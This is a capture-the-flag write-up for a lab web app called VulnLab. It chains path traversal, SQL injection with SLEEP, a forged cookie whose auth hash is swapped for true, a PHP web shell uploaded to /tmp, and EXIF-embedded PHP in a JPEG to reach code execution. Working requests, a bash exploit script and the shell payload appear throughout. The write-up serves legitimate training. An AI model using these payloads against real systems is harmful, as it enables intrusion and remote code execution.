# VulnLab

<figure><img src="../../.gitbook/assets/vulnlab/pic8.png" alt=""><figcaption></figcaption></figure>

Upon browsing our VulnLab instance we immediately notice a request to `/thumbnail?file=bg2.jpg`. The first thing that comes to mind is of course path traversal. In fact if we request `/etc/passwd` with a classic payload we get an error message:

```
GET /thumbnail?file=../../../../../../../etc/passwd HTTP/1.1

Reading content from this directory is denied
```

which is different from say this one:

```
GET /thumbnail?file=../../../../../../../tmp/foobar HTTP/1.1

File doesn't exist
```

We keep this information in mind for the moment: it will be useful later. The second thing that stands out are requests to an `/analytics` endpoint:

```
GET /analytics?page=/news/1 HTTP/1.1
```

It's easy to see that `/analytics` is vulnerable to SQL injection so we can dump the db where we find a users table:

```
Database: vulnlab
Table: user
[1 entry]
+----+----------------------------------+-----------+
| id | password                         | username  |
+----+----------------------------------+-----------+
| 1  | ******************************** | bob.jones |
+----+----------------------------------+-----------+
```

The hash did not crack - at least for me - but now we have a valid username we can use and try bruteforcing the login form:

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Finding a valid password is of course left as an exercise to the reader, but like in any Adam's challenge, when bruteforce is involved you can just use wordlists suggested on HackingHub.io.

We now have a new endpoint `/account/files` that lists our user's medical results:

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

```
GET /account/files HTTP/1.1

{"files":[{"link":"\/uploads\/bob.jones\/medical-report-to-complete.pdf","name":"medical-report-to-complete.pdf","extension":"pdf","size":60154}]}
```

Here we notice that we have "files" list where bob.jones, our username, is somehow involved in the path.

More importantly, upon logging in we have a strange cookie that contains some useful information:

```
Cookie: token=eyJkYXRhIjoiZXlKcFpDSTZNaXdpZFhObGNtNWhiV1VpT2lKaWIySXVhbTl1WlhNaWZRPT0iLCJhdXRoIjoiNmI3ZjZjYzI0NjhjNzBhN2U5N2I0MjM3ZGEyMDBmY2YifQ%3D%3D
```

The cookie decodes to

```
{"data":"eyJpZCI6MiwidXNlcm5hbWUiOiJib2Iuam9uZXMifQ==","auth":"6b7f6cc2468c70a7e97b4237da200fcf"}
```

and the info inside the JSON data attribute decodes to:

```
{"id":2,"username":"bob.jones"}
```

Maybe if we are able to change the data inside the cookie to a path traversal payload like `"username"="../../../../etc/passwd"`, we can try to read arbitrary files.

This part can be tricky: the auth hash authenticates the information inside the data attribute of our JSON. Without knowing some secret information we cannot alter what's inside data. But we can fool the hash validation by changing the "auth" string with a boolean true:

```
{"data":"eyJpZCI6MiwidXNlcm5hbWUiOiJib2Iuam9uZXMifQ==","auth":true}
```

Notice that here we are using a "counterfit" token:

```
GET /account/files HTTP/1.1
Cookie: token=eyJkYXRhIjoiZXlKcFpDSTZNaXdpZFhObGNtNWhiV1VpT2lKaWIySXVhbTl1WlhNaWZRPT0iLCJhdXRoIjp0cnVlfQ%3d%3d

{"files":[{"link":"\/uploads\/bob.jones\/medical-report-to-complete.pdf","name":"medical-report-to-complete.pdf","extension":"pdf","size":60154}]}
```

This not only works without giving errors, but it allows us to alter the inner content of the data attribute. Using a very handy burp extension which is called Hackvector (or of course constructing payloads manually) we can use something like this:

```
GET /account/files HTTP/1.1
Host: veap5r6i.eu1.ctfio.com
Cookie: token=<@burp_urlencode><@base64>{"data":"<@base64>{"id":2,"username":"../../../../../../../etc/passwd"}<@/base64>","auth":true}<@/base64><@/burp_urlencode>

{"error":"Not a valid directory"}
```

and we get an interesting error. What if we try to look at /etc or /tmp?

```
GET /account/files HTTP/1.1
Host: veap5r6i.eu1.ctfio.com
Cookie: token=<@burp_urlencode><@base64>{"data":"<@base64>{"id":2,"username":"../../../../../../../etc"}<@/base64>","auth":true}<@/base64><@/burp_urlencode>

{"files":[{"link":"\/uploads\/..\/..\/..\/..\/..\/..\/..\/etc\/.pwd.lock","name":".pwd.lock","extension":"lock","size":0},{"link":"\/uploads\/..\/..\/..\/..\/..\/..\/..\/etc\/X11","name":"X11","extension":"","size":4096},{"link":"\/uploads\/..\/..\/..\/..\/..\/..\/..\/etc\/adduser.conf","name":"adduser.conf","extension":"conf","size":3028},...
```

Interestingly enough we have a way to list directories.

If you want to play around an alternative way is using a simple bash script:

{% code title="lfi-exploit.sh <domain> <path>" lineNumbers="true" %}
```bash
#!/bin/sh

inside='{"id":2,"username":"'$2'"}'
inside=$(/bin/echo -n $inside | base64)
token=$(/bin/echo -n '{"auth":true,"data":"'$inside'"}' |base64)

echo $token
curl $1/account/files -H "Cookie: token=$token" | jq
curl $1/account/files -H "Cookie: token=$token" | jq  -r '.files[] |.link'
```
{% endcode %}

For flag number 2 it's enough to list `../` to find a secret file.

But now what? Remember that at this point we have three things that we have to put together to reach a much better result (RCE in the end):

1. a SQL injection on `/analytics?page=/news/1`;
2. the possibility to list directories, and in particular `/tmp`;
3. maybe (we are not sure yet), the possibility to include files from `/tmp` directory via `/thumbnail?file=../../../../../../../tmp/foobar`.

Are we able to upload files to /tmp? Sure: during file upload PHP, the language of choice by Adam, creates temporary files under /tmp. Files have a random name, so it will be hard to list /tmp/ with the second vulnerability unless we can also let the server SLEEP during upload using the SQL injection. So we can try something like this:

```
POST /analytics?page=a';SELECT+SLEEP+(60)%23 HTTP/1.1
...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoy6htU17IDYnPK7v
Content-Length: 221

------WebKitFormBoundaryoy6htU17IDYnPK7v
Content-Disposition: form-data; name="file_to_upload"; filename="shell.php"
Content-Type: text/php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryoy6htU17IDYnPK7v--
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

this gives us 60 second to list files under /tmp/:

```
GET /account/files HTTP/1.1
Cookie: token=<@burp_urlencode><@base64>{"data":"<@base64>{"id":2,"username":"../../../../../../tmp/"}<@/base64>","auth":true}<@/base64><@/burp_urlencode>
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

So now it's just a matter of including what we uploaded and...

```
GET /thumbnail?file=../../../../../../../tmp/phpzaP6ow HTTP/1.1

HTTP/1.1 200 OK
Server: nginx/1.22.0 (Ubuntu)
Date: Sat, 06 Jul 2024 15:02:10 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Content-Length: 22

Not a valid image file
```

we need to overcome the last defense with a real image that also contains actual php code.

Please note that a valid jpg image is necessary because, as you will see once you have a shell, there is this restriction in place:

```php
if (@exif_imagetype($file)) {
	header('Content-Type: image/jpg');
	include_once($file);
} else {
	die("Not a valid image file");
}
```

I order to facilitate the process we can create a very simple form on our machine to do the POST:

```html
<form method="post" enctype="multipart/form-data" action="https://xyz.eu1.ctfio.com/analytics?page=a';SELECT SLEEP(300)-- -">
        <input type="file"  name="file_to_upload" >
        <input type="submit" name="submit">
        </form>
```

and before uploading a real jpg we can insert in it a PHP payload with exiftool:

```bash
exiftool  -author='<?php system($_GET["cmd"]); ?>' test.jpg
```

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

This part can be quite tricky but in the end you will have command exectuion and you can also grab a valid shell

```bash
www-data@3af02839d4cf:/$ wc -c /flag.txt
46 /flag.txt
```
